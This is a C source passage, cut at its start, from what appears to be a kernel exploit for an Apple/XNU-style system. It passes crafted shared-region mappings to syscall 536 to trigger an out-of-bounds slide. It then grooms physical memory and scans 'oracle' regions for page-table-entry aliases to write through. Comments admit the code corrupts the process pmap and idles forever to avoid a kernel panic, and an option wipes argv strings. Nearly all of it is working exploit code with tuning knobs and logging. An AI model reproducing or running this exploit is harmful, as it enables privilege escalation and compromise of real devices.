		sc6(73, ORACLE_HOLES[idx], PAGE_SZ, 0, 0, 0, 0);
	}
	S("[R] oracle deferred hole order=");
	H(ORACLE_HOLE_FREE_ORDER);
	S("[R] oracle deferred holes=");
	H(holes_saved);
#endif
#else
	u64 size = (u64)ORACLE_REGIONS * ORACLE_STRIDE + ORACLE_STRIDE;
	long p = sc6(197, 0, size, PROT_RW, MAP_PRIVATE_ANON, -1, 0);
	u64 base;

	if ((u64)p >= 0x100000000ULL) {
		base = align_up((u64)p, ORACLE_STRIDE);
		for (u64 i = 0; i < ORACLE_REGIONS; i++) {
			volatile u64 *p0 = (volatile u64 *)(base + i * ORACLE_STRIDE);
				volatile u64 *p1 = (volatile u64 *)(base + i * ORACLE_STRIDE + PAGE_SZ);
				p0[0] = ORACLE_SENT0 ^ i;
				p1[0] = ORACLE_SENT1 ^ i;
				for (u64 j = 2; j < ORACLE_TRACK_PAGES; j++) {
					volatile u64 *pj = (volatile u64 *)(base + i * ORACLE_STRIDE + j * PAGE_SZ);
					pj[0] = oracle_extra_sent(i, j);
				}
#if ORACLE_EXTRA_PAGE_INDEX < 2048
				if (ORACLE_EXTRA_PAGE_INDEX >= ORACLE_TRACK_PAGES) {
					volatile u64 *px = (volatile u64 *)(base + i * ORACLE_STRIDE + ORACLE_EXTRA_PAGE_INDEX * PAGE_SZ);
					px[0] = oracle_extra_sent(i, ORACLE_EXTRA_PAGE_TAG);
				}
#endif
				ORACLE_BASES[i] = (u64)p0;
			made++;
		}
	} else {
		S("[R] oracle mmap fail=");
		H((u64)p);
	}
#endif

	S("[R] oracle made=");
	H(made);
	if (made != 0) {
		S("[R] oracle first=");
		H(ORACLE_BASES[0]);
	}
	S("[R] oracle extra page=");
	H(ORACLE_EXTRA_PAGE_INDEX);
}

static void
scan_oracle_regions(u64 phys_scan_base_runtime)
{
	u64 hits = 0;
	u64 aliases = 0;
	u64 pte_candidates = 0;
	u64 pte_alias_writes = 0;
	u64 cross_aliases = 0;
#if ORACLE_WRITE_CROSS_ALIAS > 0
	u64 writes = 0;
#endif

	for (u64 i = 0; i < ORACLE_REGIONS; i++) {
		u64 base = ORACLE_BASES[i];
		u64 e0 = ORACLE_SENT0 ^ i;
		u64 e1 = ORACLE_SENT1 ^ i;
		if (base == 0) {
			continue;
		}

		volatile u64 *p0 = (volatile u64 *)base;
		volatile u64 *p1 = (volatile u64 *)(base + PAGE_SZ);
		u64 v0 = p0[0];
		u64 v1 = p1[0];
		u64 formula0 = (e0 & 0x3ffffffffULL) + VALUE_ADD;
		u64 formula1 = (e1 & 0x3ffffffffULL) + VALUE_ADD;
		u64 alias_idx;
		u64 alias_which;

		if (v0 == e1 || v1 == e0) {
			aliases++;
		}
		if (oracle_decode(v0, &alias_idx, &alias_which) && alias_idx != i) {
			if (cross_aliases < 16) {
				S("[R] oracle cross alias from=");
				H(i);
				S("[R] oracle cross alias to=");
				H(alias_idx);
				S("[R] oracle cross alias which=");
				H(alias_which);
				S("[R] oracle cross alias value=");
				H(v0);
			}
			cross_aliases++;
#if ORACLE_WRITE_CROSS_ALIAS > 0
			p0[0] = ORACLE_WRITE_MARKER ^ i;
			writes++;
#endif
		}
#if ORACLE_PTE_SCAN > 0
			if (v0 != formula0 && v0 != e0) {
					scan_oracle_pte_page(i, 0, p0, &pte_candidates, &pte_alias_writes, phys_scan_base_runtime);
				}
					if (v1 != formula1 && v1 != e1) {
						scan_oracle_pte_page(i, 1, p1, &pte_candidates, &pte_alias_writes, phys_scan_base_runtime);
					}
			for (u64 j = 2; j < ORACLE_TRACK_PAGES; j++) {
				volatile u64 *pj = (volatile u64 *)(base + j * PAGE_SZ);
				u64 ej = oracle_extra_sent(i, j);
				u64 vj = pj[0];
					u64 formulaj = (ej & 0x3ffffffffULL) + VALUE_ADD;
					if (vj != formulaj && vj != ej) {
						scan_oracle_pte_page(i, j, pj, &pte_candidates, &pte_alias_writes, phys_scan_base_runtime);
					}
				}
#if ORACLE_EXTRA_PAGE_INDEX < 2048
			if (ORACLE_EXTRA_PAGE_INDEX >= ORACLE_TRACK_PAGES) {
				volatile u64 *px = (volatile u64 *)(base + ORACLE_EXTRA_PAGE_INDEX * PAGE_SZ);
				u64 ex = oracle_extra_sent(i, ORACLE_EXTRA_PAGE_TAG);
				u64 vx = px[0];
					u64 formulax = (ex & 0x3ffffffffULL) + VALUE_ADD;
					if (vx != formulax && vx != ex) {
						scan_oracle_pte_page(i, ORACLE_EXTRA_PAGE_INDEX, px, &pte_candidates, &pte_alias_writes, phys_scan_base_runtime);
					}
				}
#endif
#endif
		if (v0 != e0 || v1 != e1) {
			if (hits < 16) {
				S("[R] oracle hit index=");
				H(i);
				S("[R] oracle v0=");
				H(v0);
				S("[R] oracle e0=");
				H(e0);
				S("[R] oracle v1=");
				H(v1);
				S("[R] oracle e1=");
				H(e1);
#if ORACLE_DUMP_WORDS > 0
				if ((v0 != formula0 && v0 != e0) || (v1 != formula1 && v1 != e1)) {
					for (u64 j = 0; j < ORACLE_DUMP_WORDS; j++) {
						S("[R] oracle dump word=");
						H(j);
						S("[R] oracle dump value=");
						H(p0[j]);
					}
				}
#endif
			}
			hits++;
		}
	}
	S("[R] oracle hits=");
	H(hits);
	S("[R] oracle aliases=");
	H(aliases);
	S("[R] oracle cross aliases=");
	H(cross_aliases);
#if ORACLE_WRITE_CROSS_ALIAS > 0
	S("[R] oracle cross writes=");
	H(writes);
	u64 seen = 0;
	for (u64 i = 0; i < ORACLE_REGIONS; i++) {
		u64 base = ORACLE_BASES[i];
		if (base == 0) {
			continue;
		}
		volatile u64 *p0 = (volatile u64 *)base;
		volatile u64 *p1 = (volatile u64 *)(base + PAGE_SZ);
		u64 v0 = p0[0];
		u64 v1 = p1[0];
		if ((v0 & 0xffff000000000000ULL) == (ORACLE_WRITE_MARKER & 0xffff000000000000ULL) ||
		    (v1 & 0xffff000000000000ULL) == (ORACLE_WRITE_MARKER & 0xffff000000000000ULL)) {
			if (seen < 16) {
				S("[R] oracle write seen index=");
				H(i);
				S("[R] oracle write seen v0=");
				H(v0);
				S("[R] oracle write seen v1=");
				H(v1);
			}
			seen++;
		}
	}
	S("[R] oracle write seen=");
	H(seen);
#endif
#if ORACLE_PTE_SCAN > 0
	S("[R] oracle pte candidates=");
	H(pte_candidates);
	S("[R] oracle pte alias writes=");
	H(pte_alias_writes);
#endif
}

static void
rescan_oracle_regions(u64 phys_scan_base_runtime)
{
	(void)phys_scan_base_runtime;
#if ORACLE_RESCAN_ROUNDS > 0
	S("[R] oracle rescan pid=");
	H((u64)sc6(20, 0, 0, 0, 0, 0, 0));
	for (u64 round = 0; round < ORACLE_RESCAN_ROUNDS; round++) {
			spin_delay(ORACLE_RESCAN_SPINS);
			S("[R] oracle rescan round=");
			H(round);
			scan_oracle_regions(phys_scan_base_runtime);
		}
#endif
}
#endif

static void
prefault_later_pages(volatile char *base)
{
#if PREFLT_PAGES > 1
	u64 acc = 0;
	u64 later = PREFLT_PAGES - 1;
#if TARGET_TOUCH_PAGES > 0
	if (TARGET_TOUCH_PAGES <= 1) {
		later = 0;
	} else if (TARGET_TOUCH_PAGES - 1 < later) {
		later = TARGET_TOUCH_PAGES - 1;
	}
#endif
#if PREFLT_ASCENDING > 0
	for (u64 n = 0; n < later; n++) {
		u64 i = 1 + n;
		acc += (unsigned char)base[i * PAGE_SZ];
	}
#else
	for (u64 n = 0; n < later; n++) {
		u64 i = PREFLT_PAGES - 1 - n;
		acc += (unsigned char)base[i * PAGE_SZ];
	}
#endif
	S("[R] prefault acc=");
	H(acc);
	S("[R] prefault later pages=");
	H(later);
#else
	(void)base;
#endif
}

static u64
target_map_base(u64 map_index)
{
	return SR_BASE + map_index * (u64)TARGET_SIZE;
}

static void
scan_mapping_hits(u64 map_index, volatile char *base)
{
#if PREFLT_PAGES > 1
	u64 hits = 0;
	u64 later = PREFLT_PAGES - 1;
#if TARGET_TOUCH_PAGES > 0
	if (TARGET_TOUCH_PAGES <= 1) {
		later = 0;
	} else if (TARGET_TOUCH_PAGES - 1 < later) {
		later = TARGET_TOUCH_PAGES - 1;
	}
#endif
	for (u64 n = 0; n < later; n++) {
#if PREFLT_ASCENDING > 0
		u64 i = 1 + n;
#else
		u64 i = PREFLT_PAGES - 1 - n;
#endif
		volatile u64 *p = (volatile u64 *)(base + i * PAGE_SZ + SCAN_OFFSET);
		u64 v = p[0];
		if (v != 0) {
			if (hits < 16) {
				S("[R] map hit target=");
				H(map_index);
				S("[R] map hit page=");
				H(i);
				S("[R] map hit value=");
				H(v);
			}
			hits++;
		}
	}
	S("[R] map hits target=");
	H(map_index);
	S("[R] map hits=");
	H(hits);
	S("[R] map hit scanned later pages=");
	H(later);
#else
	(void)map_index;
	(void)base;
#endif
}

void
cmain(u64 *sp0)
{
	u64 argc = sp0 ? sp0[0] : 0;
	char **argv = sp0 ? (char **)&sp0[1] : 0;
	u64 phys_scan_base_runtime;

#if SURVIVE_LOOP > 0
	/* Detach into our own session so we survive the launcher/ssh exit without
	 * catching SIGHUP (which would tear down our corrupted pmap and panic). */
	sc6(147, 0, 0, 0, 0, 0, 0); /* SYS_setsid */
#endif

#if PROCNAME_MARKER > 0
	PHYS_SCAN_WORD_RUNTIME = ORACLE_PTE_PHYS_SCAN_WORD;
#endif
	if (argc > 1 && argv != 0) {
		u64 arg_base = parse_hex(argv[1]);
		if (arg_base != 0) {
			PHYS_SCAN_BASE_RUNTIME = arg_base;
		}
	}
	phys_scan_base_runtime = PHYS_SCAN_BASE_RUNTIME;
#if ORACLE_PTE_PHYS_SCAN_WORD1_ARG > 0
	if (argc > ORACLE_PTE_PHYS_SCAN_WORD1_ARG && argv != 0) {
		u64 arg_word1 = parse_hex(argv[ORACLE_PTE_PHYS_SCAN_WORD1_ARG]);
		if (arg_word1 != 0) {
			PHYS_SCAN_WORD1_RUNTIME = arg_word1;
		}
	}
#endif
#if WIPE_ARGV_STRINGS > 0
	if (argv != 0) {
		for (u64 i = 0; i < argc; i++) {
			wipe_string(argv[i]);
		}
	}
#endif
#if PROCNAME_MARKER > 0
	setup_procname_marker();
#endif
	S("[R] argc=");
	H(argc);
	S("[R] start offset=");
	H(START_OFFSET);
	S("[R] alt start offset=");
	H(ALT_START_OFFSET);
	S("[R] alt start mode=");
	H(ALT_START_MODE);
	S("[R] value add=");
	H(VALUE_ADD);
	S("[R] pte entry index=");
	H(PTE_ENTRY_INDEX);
	S("[R] pte distance pages=");
	H(PTE_DISTANCE_PAGES);
	S("[R] target pages=");
	H(TARGET_SIZE / PAGE_SZ);
	S("[R] target maps=");
	H(TARGET_MAPS);
	S("[R] target fault maps=");
	H(TARGET_FAULT_MAPS);
	S("[R] target touch pages=");
	H(TARGET_TOUCH_PAGES);
	S("[R] target noauth=");
	H(TARGET_NOAUTH);
	S("[R] target split files=");
	H(TARGET_SPLIT_FILES);
	S("[R] scan after each map=");
	H(ORACLE_SCAN_AFTER_EACH_MAP);
	S("[R] page starts count=");
	H(PAGE_STARTS_COUNT);
	S("[R] active start period=");
	H(ACTIVE_START_PERIOD);
	S("[R] active start phase=");
	H(ACTIVE_START_PHASE);
	S("[R] active start first=");
	H(ACTIVE_START_FIRST);
	S("[R] active start last=");
	H(ACTIVE_START_LAST);
	S("[R] prefault pages=");
	H(PREFLT_PAGES);
	S("[R] prefault ascending=");
	H(PREFLT_ASCENDING);
	S("[R] oracle tracked pages=");
	H(ORACLE_TRACK_PAGES);
	S("[R] oracle hole pages=");
	H(ORACLE_HOLE_PAGES);
	S("[R] oracle defer hole free=");
	H(ORACLE_DEFER_HOLE_FREE);
	S("[R] oracle hole free order=");
	H(ORACLE_HOLE_FREE_ORDER);
	S("[R] oracle before setup=");
	H(ORACLE_BEFORE_SETUP);
	S("[R] phys scan runtime base=");
	H(phys_scan_base_runtime);
	S("[R] phys scan reverse=");
	H(ORACLE_PTE_PHYS_SCAN_REVERSE);
#if PROCNAME_MARKER > 0
	S("[R] phys scan runtime word=");
	H(PHYS_SCAN_WORD_RUNTIME);
#endif
#if ORACLE_PTE_PHYS_SCAN_WORD1 != 0 || ORACLE_PTE_PHYS_SCAN_WORD1_ARG > 0
	S("[R] phys scan runtime word1=");
	H(PHYS_SCAN_WORD1_RUNTIME);
#endif

	FILES[0].sf_fd = -1;
	FILES[0].sf_mappings_count = 1;
	FILES[0].sf_slide = 0;
#if TARGET_SPLIT_FILES > 0
	for (u64 i = 0; i < TARGET_MAPS; i++) {
		FILES[1 + i].sf_fd = 3;
		FILES[1 + i].sf_mappings_count = 1;
		FILES[1 + i].sf_slide = 0;
	}
#else
	FILES[1].sf_fd = 3;
	FILES[1].sf_mappings_count = TARGET_MAPS;
	FILES[1].sf_slide = 0;
#endif

	MAPS[0].sms_address = SR_MAL_MAP;
	MAPS[0].sms_size = 0x4000;
#if RUNTIME_HELPER > 0
	u64 helper_addr = setup_helper_page();
	if (helper_addr == 0) {
		return;
	}
	MAPS[0].sms_file_offset = helper_addr;
#else
	MAPS[0].sms_file_offset = (u64)&HELPER;
#endif
	MAPS[0].sms_slide_size = 0;
	MAPS[0].sms_slide_start = 0;
	MAPS[0].sms_max_prot = VM_PROT_READ;
	MAPS[0].sms_init_prot = VM_PROT_READ;

	for (u64 i = 0; i < TARGET_MAPS; i++) {
		u64 m = 1 + i;
		MAPS[m].sms_address = target_map_base(i);
		MAPS[m].sms_size = TARGET_SIZE;
		MAPS[m].sms_file_offset = 0;
#if RUNTIME_HELPER > 0
		MAPS[m].sms_slide_size = sizeof(struct v5mal);
#else
		MAPS[m].sms_slide_size = sizeof(HELPER.mal);
#endif
		MAPS[m].sms_slide_start = SR_MAL_MAP;
		MAPS[m].sms_max_prot = VM_PROT_READ | VM_PROT_SLIDE;
#if TARGET_NOAUTH > 0
		MAPS[m].sms_max_prot |= VM_PROT_NOAUTH;
#endif
		MAPS[m].sms_init_prot = VM_PROT_READ | VM_PROT_ZF;
	}

#if ORACLE_REGIONS > 0 && ORACLE_BEFORE_SETUP > 0
	setup_oracle_regions();
#endif

	long r = sc6(536, FILES_COUNT, (long)&FILES[0], 1 + TARGET_MAPS, (long)&MAPS[0], 0, 0);
	S("[R] 536 ret=");
	H((u64)r);

	CHECK_START = 0;
	long cr = sc6(294, (long)&CHECK_START, 0, 0, 0, 0, 0);
	S("[R] check ret=");
	H((u64)cr);
	S("[R] check start=");
	H(CHECK_START);

#if ABORT_ON_SETUP_FAIL > 0
	if (r != 0 || cr != 0 || CHECK_START != SR_BASE) {
		S("[R] abort setup failed\n");
		return;
	}
#endif

#if ORACLE_REGIONS > 0 && ORACLE_BEFORE_SETUP == 0
	setup_oracle_regions();
#endif

#if GROOM_PAIRS > 0
	groom_phys_neighbor();
#endif

	u64 fault_maps = TARGET_MAPS;
#if TARGET_FAULT_MAPS > 0
	if (TARGET_FAULT_MAPS < fault_maps) {
		fault_maps = TARGET_FAULT_MAPS;
	}
#endif
	for (u64 i = 0; i < fault_maps; i++) {
		volatile char *b = (volatile char *)target_map_base(i);
		S("[R] fault target map=");
		H(i);
		prefault_later_pages(b);
		volatile char a = b[0];
		S("[R] byte0 map=");
		H(i);
		S("[R] byte0=");
		H((u64)(unsigned char)a);
#if READ_OFFSET != 0
		volatile char c = b[READ_OFFSET];
		S("[R] byte@READ_OFFSET map=");
		H(i);
		S("[R] byte@READ_OFFSET=");
		H((u64)(unsigned char)c);
#endif
#if ORACLE_REGIONS > 0 && ORACLE_SCAN_AFTER_EACH_MAP > 0
		S("[R] oracle scan after target map=");
		H(i);
		scan_oracle_regions(phys_scan_base_runtime);
		rescan_oracle_regions(phys_scan_base_runtime);
#endif
	}
#if ORACLE_REGIONS > 0 && ORACLE_SCAN_AFTER_EACH_MAP == 0
	scan_oracle_regions(phys_scan_base_runtime);
	rescan_oracle_regions(phys_scan_base_runtime);
#endif
#if GROOM_PAIRS > 0
	scan_groom_hits();
#endif
	for (u64 i = 0; i < fault_maps; i++) {
		volatile char *b = (volatile char *)target_map_base(i);
		scan_mapping_hits(i, b);
	}
#if SURVIVE_LOOP > 0
	/* Miss path: we ran the OOB slide (corrupted our pmap); returning into
	 * _start's exit() would panic in pmap teardown. Idle forever instead;
	 * the runner reboots before the next attempt, which clears us cleanly. */
	survive_forever();
#endif
}
